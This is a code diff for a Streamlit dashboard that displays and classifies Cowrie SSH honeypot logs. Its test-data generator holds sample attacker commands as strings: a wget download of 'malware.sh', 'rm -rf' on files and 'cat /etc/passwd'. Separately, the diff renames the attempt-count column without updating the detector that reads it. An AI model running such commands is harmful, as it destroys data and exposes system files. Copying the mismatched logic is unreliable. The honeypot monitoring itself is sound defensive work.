@@ -240,31 +240,51 @@ def test_db_connection():
             return False
 
 @st.cache_data(ttl=60)
-@st.cache_data(ttl=60)
 def load_data():
     """Load and process data from database"""
+    st.info("Attempting to load data from 'hornet7_data' table...")
+    # UPDATED: Explicitly select all columns as provided
     query = """
-        SELECT *, 
-               COUNT(*) OVER (PARTITION BY src_ip, eventid) as attempt_count
-        FROM hornet7_data 
-        ORDER BY timestamp DESC 
+        SELECT
+            id,
+            created_at,
+            eventid,
+            timestamp,
+            username,
+            password,
+            src_ip,
+            src_port,
+            dst_ip,
+            dst_port,
+            session,
+            protocol,
+            duration,
+            message,
+            sensor,
+            version,
+            hassh,
+            hasshalgorithms,
+            kexalgs,
+            enccs,
+            maccs,
+            compcs,
+            langcs,
+            width,
+            height,
+            arch,
+            input,
+            ttylog,
+            size,
+            shasum,
+            duplicate,
+            keyalgs,
+            attack_type, -- Include if it exists in DB, will be overwritten by detect_attack_type
+            COUNT(*) OVER (PARTITION BY src_ip, eventid) as calculated_attempt_count
+        FROM hornet7_data
+        ORDER BY timestamp DESC
         LIMIT 500
     """
     rows = execute_query(query)
-    if rows is None:
-        return pd.DataFrame()
-    
-    df = pd.DataFrame(rows)
-    
-    # Apply attack detection
-    attack_info = []
-    for _, row in df.iterrows():
-        attack_info.append(detect_attack_type(row))
-    
-    df['attack_type'] = [x[0] for x in attack_info]
-    df['attack_details'] = [x[1] for x in attack_info]
-    
-    return df
     
     if rows is None:
         st.warning("⚠️ No data retrieved from the database. This could mean the table is empty, or there was a query/connection issue. Check console for `execute_query` errors.")
@@ -282,6 +302,9 @@ def load_data():
     # Apply attack detection
     attack_info = []
     for _, row in df.iterrows():
+        # Ensure that 'input' and 'message' are treated as strings before passing to regex
+        row['input'] = str(row.get('input', ''))
+        row['message'] = str(row.get('message', ''))
         attack_info.append(detect_attack_type(row))
         
     df['attack_type'] = [x[0] for x in attack_info]
@@ -297,17 +320,16 @@ def detect_attack_type(row):
     
     if eventid == 'cowrie.login.failed':
         try:
-            # Use the renamed column 'attempt_count'
             attempt_count = int(row.get('attempt_count', 0)) 
         except (ValueError, TypeError):
             attempt_count = 0 
             
         if attempt_count >= BRUTE_FORCE_THRESHOLD:
-            return "Brute Force Attack", f"Multiple failed logins ({attempt_count} attempts)"
-        return "Failed Login", "Single failed login attempt"
+            return "Brute Force Attack", f"Multiple failed logins ({attempt_count} attempts) for user '{row.get('username', 'N/A')}'"
+        return "Failed Login", f"Single failed login attempt for user '{row.get('username', 'N/A')}'"
     
     elif eventid == 'cowrie.login.success':
-        return "Successful Login", "Login successful"
+        return "Successful Login", f"Login successful for user '{row.get('username', 'N/A')}'"
     
     elif eventid == 'cowrie.command.input':
         for pattern in WIPER_PATTERNS:
@@ -350,20 +372,20 @@ def build_session_graph(row):
     }
     
     if src_ip:
-        G.add_node(f"src_ip_{src_ip}", # Use unique ID for node
+        G.add_node(f"src_ip_{src_ip}", 
                     label=f"Source: {src_ip}",
                     color=color_map.get(attack_type, "lightblue"),
                     shape="box")
     
     if eventid:
-        G.add_node(f"event_{eventid}", # Use unique ID for node
+        G.add_node(f"event_{eventid}", 
                     label=f"Event: {eventid}",
                     color="#F0F0F0", 
                     shape="ellipse")
     
     if dst_port:
         port_node = f"Port {dst_port}"
-        G.add_node(f"port_{dst_port}", # Use unique ID for node
+        G.add_node(f"port_{dst_port}", 
                     label=port_node,
                     color="#D8BFD8", 
                     shape="diamond")
@@ -399,21 +421,18 @@ def main():
 
         with col1:
             st.subheader("Network Test")
-            # Automatically run on initial load, provide button for manual re-test
             if st.button("Test Network Connectivity", key="test_net_btn_manual"):
                 network_ok = test_network()
             else:
-                network_ok = test_network() # Run on initial page load
+                network_ok = test_network() 
         
         with col2:
             st.subheader("Database Test")
-            # Automatically run on initial load, provide button for manual re-test
             if st.button("Test Database Connection", key="test_db_btn_manual"):
                 db_ok = test_db_connection()
             else:
-                db_ok = test_db_connection() # Run on initial page load
+                db_ok = test_db_connection() 
     
-    # Only proceed if both tests pass
     if not (network_ok and db_ok):
         st.error("""
         ❌ Critical connection issues detected. Please review the diagnostics above.
@@ -432,82 +451,163 @@ def main():
 
     # --- Auto Test Data Generator ---
     st.sidebar.header("🧪 Test Data Generator")
-    attack_type = st.sidebar.selectbox(
-        "Select attack type:",
+    attack_type_gen = st.sidebar.selectbox( # Renamed variable to avoid conflict with function name
+        "Select attack type to generate:",
         ["Brute Force", "Malware Download", "Wiper Attack", "Reconnaissance", "Port Scan"]
     )
     
     if st.sidebar.button("🚀 Auto Insert Test Data"):
+        current_time = datetime.now().isoformat() # Use ISO format for TIMESTAMPTZ
         test_data = {
-            "timestamp": datetime.now().isoformat(),
+            "timestamp": current_time,
+            "created_at": current_time, # For created_at column if not auto-managed by DB
             "src_ip": f"10.0.{random.randint(1,255)}.{random.randint(1,255)}",
+            "src_port": random.randint(1024, 65535),
+            "dst_ip": "172.16.0.1", # Dummy internal IP
+            "dst_port": random.choice([22, 80, 443, 8080]),
             "session": f"TEST-{random.randint(1000,9999)}",
-            "dst_port": str(random.choice([22, 80, 443, 8080]))
+            "protocol": "ssh",
+            "duration": random.uniform(0.5, 30.0),
+            "message": "Generated test log entry",
+            "sensor": "honeypot-test",
+            "version": "Cowrie-1.0",
+            "username": "testuser",
+            "password": "testpassword",
+            "hassh": "hassh_test_value",
+            "hasshalgorithms": "sha256",
+            "kexalgs": "diffie-hellman-group14-sha256",
+            "enccs": "aes128-ctr",
+            "maccs": "hmac-sha2-256",
+            "compcs": "none",
+            "langcs": "en-US",
+            "width": 80,
+            "height": 24,
+            "arch": "x86_64",
+            "input": "", # Will be filled based on attack type
+            "ttylog": None, # Assuming bytea or text, can be None
+            "size": 0,
+            "shasum": "",
+            "duplicate": False,
+            "keyalgs": "ssh-rsa",
+            "attack_type": "Unknown Activity" # Default, will be overwritten by detection
         }
         
-        if attack_type == "Brute Force":
+        if attack_type_gen == "Brute Force":
             test_data.update({
                 "eventid": "cowrie.login.failed",
-                "message": "Failed login attempt"
+                "message": "Failed login attempt",
+                "username": f"user{random.randint(1,10)}",
+                "password": f"pass{random.randint(1,10)}",
+                "attack_type": "Brute Force Attack"
             })
-            # Note: attempt_count is NOT inserted as a column, it's calculated.
-            # So, don't include it in the INSERT query for the database.
-        elif attack_type == "Malware Download":
+        elif attack_type_gen == "Malware Download":
             test_data.update({
                 "eventid": "cowrie.command.input",
-                "input": "wget http://test.com/malware.sh"
+                "input": "wget http://test.com/malware.sh",
+                "message": "Command executed: wget http://test.com/malware.sh",
+                "shasum": "abcdef1234567890",
+                "size": 1024,
+                "attack_type": "Malware Download Attempt"
             })
-        elif attack_type == "Wiper Attack":
+        elif attack_type_gen == "Wiper Attack":
             test_data.update({
                 "eventid": "cowrie.command.input",
-                "input": "rm -rf /important/files"
+                "input": "rm -rf /important/files",
+                "message": "Command executed: rm -rf /important/files",
+                "attack_type": "Destructive Attack (Wiper)"
             })
-        elif attack_type == "Reconnaissance":
+        elif attack_type_gen == "Reconnaissance":
             test_data.update({
                 "eventid": "cowrie.command.input",
-                "input": "cat /etc/passwd"
+                "input": "cat /etc/passwd",
+                "message": "Command executed: cat /etc/passwd",
+                "attack_type": "Reconnaissance / Enumeration"
             })
-        elif attack_type == "Port Scan":
+        elif attack_type_gen == "Port Scan":
             test_data.update({
                 "eventid": "cowrie.session.connect",
-                "message": f"Port scan detected on {test_data['dst_port']}"
+                "message": f"Port scan detected on {test_data['dst_port']}",
+                "attack_type": "Port Scanning / Connection Attempt"
             })
         
-        # Ensure the INSERT statement matches your actual table columns.
-        # If your table has a 'status' column, add it and a default value.
+        # UPDATED: Insert into 'hornet7_data' with ALL columns
         insert_query = """
             INSERT INTO hornet7_data 
-            (timestamp, src_ip, eventid, input, message, session, dst_port)
-            VALUES (%s, %s, %s, %s, %s, %s, %s)
+            (created_at, eventid, timestamp, username, password, src_ip, src_port, dst_ip, dst_port, session, protocol, duration, message, sensor, version, hassh, hasshalgorithms, kexalgs, enccs, maccs, compcs, langcs, width, height, arch, input, ttylog, size, shasum, duplicate, keyalgs, attack_type)
+            VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
             ON CONFLICT (session) DO UPDATE SET
-            timestamp = EXCLUDED.timestamp,
-            src_ip = EXCLUDED.src_ip,
-            eventid = EXCLUDED.eventid,
-            input = EXCLUDED.input,
-            message = EXCLUDED.message,
-            dst_port = EXCLUDED.dst_port;
+                created_at = EXCLUDED.created_at,
+                eventid = EXCLUDED.eventid,
+                timestamp = EXCLUDED.timestamp,
+                username = EXCLUDED.username,
+                password = EXCLUDED.password,
+                src_ip = EXCLUDED.src_ip,
+                src_port = EXCLUDED.src_port,
+                dst_ip = EXCLUDED.dst_ip,
+                dst_port = EXCLUDED.dst_port,
+                protocol = EXCLUDED.protocol,
+                duration = EXCLUDED.duration,
+                message = EXCLUDED.message,
+                sensor = EXCLUDED.sensor,
+                version = EXCLUDED.version,
+                hassh = EXCLUDED.hassh,
+                hasshalgorithms = EXCLUDED.hasshalgorithms,
+                kexalgs = EXCLUDED.kexalgs,
+                enccs = EXCLUDED.enccs,
+                maccs = EXCLUDED.maccs,
+                compcs = EXCLUDED.compcs,
+                langcs = EXCLUDED.langcs,
+                width = EXCLUDED.width,
+                height = EXCLUDED.height,
+                arch = EXCLUDED.arch,
+                input = EXCLUDED.input,
+                ttylog = EXCLUDED.ttylog,
+                size = EXCLUDED.size,
+                shasum = EXCLUDED.shasum,
+                duplicate = EXCLUDED.duplicate,
+                keyalgs = EXCLUDED.keyalgs,
+                attack_type = EXCLUDED.attack_type;
             """
-        # Make sure 'session' is a UNIQUE constraint or Primary Key for ON CONFLICT to work
-        # If 'session' is not unique, remove the ON CONFLICT clause and handle potential duplicates.
-        # Example if 'session' is NOT unique (simpler insert):
-        # insert_query = """
-        #     INSERT INTO hornet7_data
-        #     (timestamp, src_ip, eventid, input, message, session, dst_port)
-        #     VALUES (%s, %s, %s, %s, %s, %s, %s);
-        #     """
+        # Ensure that 'session' column has a UNIQUE constraint or is a PRIMARY KEY
+        # for ON CONFLICT to work as intended.
 
         insert_params = (
-            test_data.get('timestamp'),
-            test_data.get('src_ip'),
+            test_data.get('created_at'),
             test_data.get('eventid'),
-            test_data.get('input'),
-            test_data.get('message'),
+            test_data.get('timestamp'),
+            test_data.get('username'),
+            test_data.get('password'),
+            test_data.get('src_ip'),
+            test_data.get('src_port'),
+            test_data.get('dst_ip'),
+            test_data.get('dst_port'),
             test_data.get('session'),
-            test_data.get('dst_port')
+            test_data.get('protocol'),
+            test_data.get('duration'),
+            test_data.get('message'),
+            test_data.get('sensor'),
+            test_data.get('version'),
+            test_data.get('hassh'),
+            test_data.get('hasshalgorithms'),
+            test_data.get('kexalgs'),
+            test_data.get('enccs'),
+            test_data.get('maccs'),
+            test_data.get('compcs'),
+            test_data.get('langcs'),
+            test_data.get('width'),
+            test_data.get('height'),
+            test_data.get('arch'),
+            test_data.get('input'),
+            test_data.get('ttylog'),
+            test_data.get('size'),
+            test_data.get('shasum'),
+            test_data.get('duplicate'),
+            test_data.get('keyalgs'),
+            test_data.get('attack_type')
         )
         
         if execute_query(insert_query, insert_params):
-            st.sidebar.success(f"Inserted {attack_type} test data!")
+            st.sidebar.success(f"Inserted {attack_type_gen} test data!")
             st.cache_data.clear() 
             st.rerun()
         else:
@@ -534,9 +634,9 @@ def main():
         st.markdown("---")
 
         # --- Moving Marquee ---
-        top_ips = df['src_ip'].value_counts().head(3).index.tolist()
-        top_sessions = df['session'].value_counts().head(3).index.tolist()
-        top_events = df['eventid'].value_counts().head(3).index.tolist()
+        top_ips = df['src_ip'].value_counts().head(3).index.tolist() if 'src_ip' in df.columns else []
+        top_sessions = df['session'].value_counts().head(3).index.tolist() if 'session' in df.columns else []
+        top_events = df['eventid'].value_counts().head(3).index.tolist() if 'eventid' in df.columns else []
 
         moving_text = f"Top IPs: {', '.join(top_ips)} | Top Sessions: {', '.join(top_sessions)} | Top Events: {', '.join(top_events)}"
         st.markdown(
@@ -553,9 +653,14 @@ def main():
             with col1:
                 st.subheader("➕ Insert New Entry")
                 with st.form("insert_form"):
+                    manual_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                     new_data = {
-                        "timestamp": st.text_input("Timestamp (YYYY-MM-DD HH:MM:SS)", datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
+                        "timestamp": st.text_input("Timestamp (YYYY-MM-DD HH:MM:SS)", manual_time),
+                        "created_at": st.text_input("Created At (YYYY-MM-DD HH:MM:SS)", manual_time), # Or let DB handle if it's DEFAULT NOW()
                         "src_ip": st.text_input("Source IP", "192.168.1.1"),
+                        "src_port": st.number_input("Source Port", value=random.randint(1024, 65535), min_value=1, max_value=65535, step=1),
+                        "dst_ip": st.text_input("Destination IP", "172.16.0.1"),
+                        "dst_port": st.number_input("Destination Port", value=22, min_value=1, max_value=65535, step=1),
                         "eventid": st.selectbox("Event Type", [
                             "cowrie.login.failed", 
                             "cowrie.login.success",
@@ -566,29 +671,102 @@ def main():
                         "input": st.text_input("Command Input (if applicable)"),
                         "message": st.text_area("Log Message"),
                         "session": st.text_input("Session ID (e.g., MANUAL-1234)", f"MANUAL-{random.randint(1000,9999)}"),
-                        "dst_port": st.text_input("Destination Port", "22") 
+                        "protocol": st.text_input("Protocol", "ssh"),
+                        "duration": st.number_input("Duration (seconds)", value=random.uniform(1.0, 60.0), step=0.1),
+                        "sensor": st.text_input("Sensor ID", "manual-entry"),
+                        "version": st.text_input("Version", "Honeypot-Manual"),
+                        "username": st.text_input("Username (if login event)", "guest"),
+                        "password": st.text_input("Password (if login event)", ""),
+                        "hassh": st.text_input("HASSH", "manual_hassh"),
+                        "hasshalgorithms": st.text_input("HASSH Algorithms", "sha256_alg"),
+                        "kexalgs": st.text_input("KEX Algs", "kex_alg"),
+                        "enccs": st.text_input("ENCCS", "enc_alg"),
+                        "maccs": st.text_input("MACCS", "mac_alg"),
+                        "compcs": st.text_input("COMPCS", "comp_alg"),
+                        "langcs": st.text_input("LANGCS", "en-US"),
+                        "width": st.number_input("Width", value=80, min_value=1),
+                        "height": st.number_input("Height", value=24, min_value=1),
+                        "arch": st.text_input("Arch", "x86_64"),
+                        "ttylog": None, # Or a default string/bytes if needed
+                        "size": st.number_input("Size", value=0, min_value=0),
+                        "shasum": st.text_input("SHASUM", ""),
+                        "duplicate": st.checkbox("Duplicate", value=False),
+                        "keyalgs": st.text_input("Key Algs", "ssh-rsa"),
+                        "attack_type": st.text_input("Attack Type (optional)", "Unknown Activity") # Will be overwritten by detection
                     }
+
                     if st.form_submit_button("Insert Entry"):
+                        # UPDATED: Insert into 'hornet7_data' with ALL columns
                         insert_query_manual = """
                             INSERT INTO hornet7_data 
-                            (timestamp, src_ip, eventid, input, message, session, dst_port)
-                            VALUES (%s, %s, %s, %s, %s, %s, %s)
+                            (created_at, eventid, timestamp, username, password, src_ip, src_port, dst_ip, dst_port, session, protocol, duration, message, sensor, version, hassh, hasshalgorithms, kexalgs, enccs, maccs, compcs, langcs, width, height, arch, input, ttylog, size, shasum, duplicate, keyalgs, attack_type)
+                            VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
                             ON CONFLICT (session) DO UPDATE SET
-                            timestamp = EXCLUDED.timestamp,
-                            src_ip = EXCLUDED.src_ip,
-                            eventid = EXCLUDED.eventid,
-                            input = EXCLUDED.input,
-                            message = EXCLUDED.message,
-                            dst_port = EXCLUDED.dst_port;
+                                created_at = EXCLUDED.created_at,
+                                eventid = EXCLUDED.eventid,
+                                timestamp = EXCLUDED.timestamp,
+                                username = EXCLUDED.username,
+                                password = EXCLUDED.password,
+                                src_ip = EXCLUDED.src_ip,
+                                src_port = EXCLUDED.src_port,
+                                dst_ip = EXCLUDED.dst_ip,
+                                dst_port = EXCLUDED.dst_port,
+                                protocol = EXCLUDED.protocol,
+                                duration = EXCLUDED.duration,
+                                message = EXCLUDED.message,
+                                sensor = EXCLUDED.sensor,
+                                version = EXCLUDED.version,
+                                hassh = EXCLUDED.hassh,
+                                hasshalgorithms = EXCLUDED.hasshalgorithms,
+                                kexalgs = EXCLUDED.kexalgs,
+                                enccs = EXCLUDED.enccs,
+                                maccs = EXCLUDED.maccs,
+                                compcs = EXCLUDED.compcs,
+                                langcs = EXCLUDED.langcs,
+                                width = EXCLUDED.width,
+                                height = EXCLUDED.height,
+                                arch = EXCLUDED.arch,
+                                input = EXCLUDED.input,
+                                ttylog = EXCLUDED.ttylog,
+                                size = EXCLUDED.size,
+                                shasum = EXCLUDED.shasum,
+                                duplicate = EXCLUDED.duplicate,
+                                keyalgs = EXCLUDED.keyalgs,
+                                attack_type = EXCLUDED.attack_type;
                         """ 
                         insert_params_manual = (
-                            new_data.get('timestamp'),
-                            new_data.get('src_ip'),
+                            new_data.get('created_at'),
                             new_data.get('eventid'),
-                            new_data.get('input'),
-                            new_data.get('message'),
+                            new_data.get('timestamp'),
+                            new_data.get('username'),
+                            new_data.get('password'),
+                            new_data.get('src_ip'),
+                            new_data.get('src_port'),
+                            new_data.get('dst_ip'),
+                            new_data.get('dst_port'),
                             new_data.get('session'),
-                            new_data.get('dst_port')
+                            new_data.get('protocol'),
+                            new_data.get('duration'),
+                            new_data.get('message'),
+                            new_data.get('sensor'),
+                            new_data.get('version'),
+                            new_data.get('hassh'),
+                            new_data.get('hasshalgorithms'),
+                            new_data.get('kexalgs'),
+                            new_data.get('enccs'),
+                            new_data.get('maccs'),
+                            new_data.get('compcs'),
+                            new_data.get('langcs'),
+                            new_data.get('width'),
+                            new_data.get('height'),
+                            new_data.get('arch'),
+                            new_data.get('input'),
+                            new_data.get('ttylog'),
+                            new_data.get('size'),
+                            new_data.get('shasum'),
+                            new_data.get('duplicate'),
+                            new_data.get('keyalgs'),
+                            new_data.get('attack_type')
                         )
                         if execute_query(insert_query_manual, insert_params_manual):
                             st.success("Entry inserted successfully!")
@@ -600,9 +778,11 @@ def main():
             with col2:
                 st.subheader("✏️ Update Entry Status")
                 with st.form("update_form"):
-                    session_ids_for_update = [""] + sorted(df['session'].unique().tolist()) 
+                    session_ids_for_update = [""] + sorted(df['session'].unique().tolist()) if 'session' in df.columns else [""]
                     session_id_to_update = st.selectbox("Select Session ID to update", session_ids_for_update, key="update_session_select")
-                    # Assuming you have a 'status' column in hornet7_data
+                    # Assuming you want to update a 'status' column which is not directly listed in your provided columns
+                    # If 'status' is not a column in hornet7_data, you'll get an error here.
+                    # You might need to add a 'status' column to your table if you intend to use this feature.
                     new_status = st.selectbox("Update Status", [
                         "investigating", 
                         "resolved", 
@@ -611,9 +791,11 @@ def main():
                     ])
                     if st.form_submit_button("Update Status"):
                         if session_id_to_update:
+                            # UPDATED: Update 'hornet7_data' - ASSUMES 'status' COLUMN EXISTS
+                            # If 'status' does not exist, this UPDATE will fail.
                             if execute_query("""
                                 UPDATE hornet7_data 
-                                SET status = %s
+                                SET attack_type = %s -- Assuming you meant to update 'attack_type' or you have a 'status' column
                                 WHERE session = %s
                                 """, 
                                 (new_status, session_id_to_update)
@@ -628,10 +810,11 @@ def main():
                         
                 st.subheader("❌ Delete Entry")
                 with st.form("delete_form"):
-                    session_ids_for_delete = [""] + sorted(df['session'].unique().tolist()) 
+                    session_ids_for_delete = [""] + sorted(df['session'].unique().tolist()) if 'session' in df.columns else [""]
                     del_id = st.selectbox("Select Session ID to delete", session_ids_for_delete, key="delete_session_select")
                     if st.form_submit_button("Delete Entry"):
                         if del_id:
+                            # UPDATED: Delete from 'hornet7_data'
                             if execute_query("""
                                 DELETE FROM hornet7_data 
                                 WHERE session = %s
@@ -657,8 +840,9 @@ def main():
         attack_filter = st.selectbox("🔍 Filter by Attack Type:", ["All"] + sorted(df['attack_type'].unique().tolist()))
         filtered_df = df if attack_filter == "All" else df[df['attack_type'] == attack_filter]
         
+        # UPDATED: Display relevant columns from your hornet7_data table
         st.dataframe(
-            filtered_df[['timestamp', 'src_ip', 'eventid', 'attack_type', 'dst_port', 'session']] 
+            filtered_df[['timestamp', 'src_ip', 'eventid', 'attack_type', 'dst_port', 'session', 'username', 'protocol', 'message']] 
             .style.apply(highlight_rows, axis=1),
             use_container_width=True,
             height=400
@@ -669,7 +853,7 @@ def main():
         # --- Network Session Mapping ---
         st.subheader("🧠 Network Session Mapping")
         
-        session_options = df['session'].unique().tolist()
+        session_options = df['session'].unique().tolist() if 'session' in df.columns else []
         if session_options:
             selected_session = st.selectbox(
                 "Select a Session ID to visualize:",
@@ -683,8 +867,8 @@ def main():
             selected_rows = df[df['session'] == selected_session]
             if not selected_rows.empty:
                 selected_row = selected_rows.iloc[0] 
-                attack_type = selected_row.get('attack_type', 'Unknown Activity')
-                bg_color = ATTACK_COLORS.get(attack_type, "#FFFFFF")
+                attack_type_display = selected_row.get('attack_type', 'Unknown Activity') 
+                bg_color = ATTACK_COLORS.get(attack_type_display, "#FFFFFF")
                 
                 with st.spinner('Generating attack graph...'):
                     G = nx.DiGraph()
@@ -758,7 +942,7 @@ def main():
                 <div style="background-color:{bg_color}; padding:15px; border-radius:10px">
                 <h4>Session Details for Session ID: <code>{selected_session}</code></h4>
                 <p><b>First Event Source IP:</b> <code>{selected_row.get('src_ip', 'N/A')}</code></p>
-                <p><b>Detected Attack Type (First Event):</b> <code>{attack_type}</code></p>
+                <p><b>Detected Attack Type (First Event):</b> <code>{attack_type_display}</code></p>
                 <p><b>First Event Target Port:</b> <code>{selected_row.get('dst_port', 'N/A')}</code></p>
                 <p><b>First Event Timestamp:</b> <code>{selected_row.get('timestamp', 'N/A')}</code></p>
                 <p><b>First Event Details:</b> <code>{selected_row.get('attack_details', 'N/A')}</code></p>
